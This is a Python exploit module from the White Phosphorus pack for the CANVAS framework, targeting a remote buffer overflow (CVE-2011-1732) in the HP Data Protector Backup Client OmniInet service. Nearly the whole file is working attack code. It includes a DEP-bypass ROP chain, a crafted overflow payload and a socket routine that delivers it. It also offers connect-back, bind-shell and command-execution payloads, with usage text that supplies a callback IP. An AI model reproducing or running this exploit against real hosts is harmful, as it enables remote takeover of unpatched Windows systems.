
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "HP Data Protecter Backup Client stutil Remote Overflow"
DESCRIPTION = "A remote overflow in the HP Data Protector Backup Client OmniInet Service"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Hewlett-Packard'
DOCUMENTATION["Date public"] = "2011-04-29"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2011-1732"
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1732'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-148/"
DOCUMENTATION["Notes"] = """
Bind MOSDEF Shell may require wp_connect_bindshell to connect.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7"]

NOTES="""
WP> White Phosphorus Exploit Pack
WP> HP Data Protecter Backup Client stutil Remote Overflow
----------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal (DEP)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_hp_dataprotector_stutil/wp_hp_dataprotector_stutil.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 5555
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (DEP)", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0d\x20\xff"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.encode_printable = True
        self.alignstack = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def buildBypass(self):
        self.log("WP> Building Universal DEP Bypass")
        depBypass = pack('<L', 0x7C348F46) # pop ebp
        depBypass += pack('<L', 0x7C38C510) 
        depBypass += pack('<L', 0x7C347AD1) # xor ebx, ebx
        depBypass += pack('<L', 0x7C349162) # pop ecx
        depBypass += pack('<L', 0x7C38C510) # rw
        depBypass += pack('<L', 0x7C348F46) # pop eb
        depBypass += pack('<L', 0x7C3487EC) # call eax; pop ecx
        depBypass += pack('<L', 0x7C3411B6) # xor eax, eax
        depBypass += pack('<L', 0x7C365645) # pop esi
        depBypass += pack("<L", 0x41411000)
        depBypass += pack('<L', 0x7C362B3B) # mov ax, si; pop esi
        depBypass += pack('<L', 0x7C345243) # ret
        depBypass += pack('<L', 0x7C3458AA) # add ebx, eax
        depBypass += pack('<L', 0x0044E51C) # xor edx, edx
        depBypass += pack('<L', 0x7C3646E5)*2 # add edx, 20
        depBypass += pack('<L', 0x7C354648) # pop edi
        depBypass += pack('<L', 0x7C3530EA) # mov eax, [eax]
        depBypass += pack('<L', 0x7C344CC1) # pop eax
        depBypass += pack('<L', 0x7C37A181) # (VP + 30) - 0EF
        depBypass += pack('<L', 0x7C355AEB) # sub eax, 30
        depBypass += pack('<L', 0x7C378C81) # pushad
        depBypass += pack('<L', 0x7C36683F) # push esp
        self.depBypass_size = len(depBypass)
        self.log("WP> Universal Bypass Size: %d bytes"%self.depBypass_size)
        return depBypass

    
    def makesploit(self):
        payload = "\x00\x01\x90\x00"
        payload += "\xFF\xFE\x32\x00\x00\x00\x20\x00\x00\x00\x20\x00\x30\x00\x00\x00"
        payload += "\x20\x00\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4E\x00\x55\x00"
        payload += "\x00\x00\x20\x00\x33\x00\x35\x00\x00\x00\x20\x00\x2D\x00\x72\x00"
        payload += "\x65\x00\x6D\x00\x6F\x00\x74\x00\x65\x00\x00\x00\x20\x00\x35\x00"
        payload += "\x35\x00\x35\x00\x35\x00"
        payload += "A"*420
        payload += pack('<L', 0x7C345243)
        payload += self.buildBypass()
        payload += self.shellcode + "B"*100
        payload += "\x00\x00\x31\x00\x32\x00\x33\x00\x00\x00"
        payload += wp_randomstring(204800)
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            self.log("WP> Sending Exploit")
            s.send(payload)
            
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        time.sleep(10)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
